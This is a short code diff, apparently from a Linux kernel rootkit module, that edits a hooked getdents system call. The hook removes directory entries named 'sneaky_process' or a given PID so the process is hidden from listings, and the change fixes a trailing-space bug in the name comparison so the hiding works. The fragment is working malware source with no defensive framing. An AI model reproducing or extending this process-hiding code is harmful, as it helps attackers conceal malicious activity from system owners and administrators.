@@ -98,7 +98,7 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs * regs) {
   }
   while (i < orig) {
     struct linux_dirent64 * d = (struct linux_dirent64 *)((void *)regs->si + i);
-    if (strcmp(d->d_name, "sneaky_process ") == 0 || strcmp(d->d_name, pidstr) == 0) {
+    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pidstr) == 0) {
       memmove((void *)d, (void *)d + d->d_reclen, orig - i - d->d_reclen);
     }
     else {
